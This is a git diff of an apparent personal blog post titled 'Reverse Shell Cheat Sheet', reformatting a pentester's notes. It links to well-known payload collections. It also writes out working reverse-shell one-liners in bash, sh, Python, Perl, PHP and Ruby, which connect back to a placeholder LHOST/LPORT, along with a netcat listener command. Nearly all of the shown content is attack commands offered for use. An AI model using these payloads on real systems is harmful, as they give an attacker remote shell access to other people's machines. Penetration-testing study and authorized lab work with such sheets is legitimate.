@@ -1,11 +1,14 @@
-Created: 08/02/2021 10:58
-Last modified: 11/02/2021 19:45
-
+---
+layout: post
+author: hyprcub
+title: Reverse Shell Cheat Sheet
+tags: cheatsheet
+---
 # References
 
-- Get Reverse-shell via Windows one-liner: [Hacking Articles](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
+- [Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
 - Reverse shell cheat sheets:
-	- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md): an awesome place to look for exotic shells
+	- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is really awesome place to look for exotic shells
 	- [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 	- [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
@@ -37,27 +40,14 @@ Replace `LHOST` with your IP and `LPORT` with your port. Don't forget to try **8
 | `/bin/bash -i >& /dev/udp/LHOST/LPORT 0>&1` | Bash UDP with listener `nc -u -lvp LPORT` |
 | `0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196` | sh |
 
-# Languages Specific
+# Language Specific
 
-Python
-```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-
-Perl
-```
-perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-
-PHP
-```
-php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-Ruby
-```
-ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-```
+| Command | Description |
+|---------|-------------|
+| `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` | Python |
+| `perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` | Perl |
+| `php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'` | PHP |
+| `ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` | Ruby |
 
 Golang
 ```
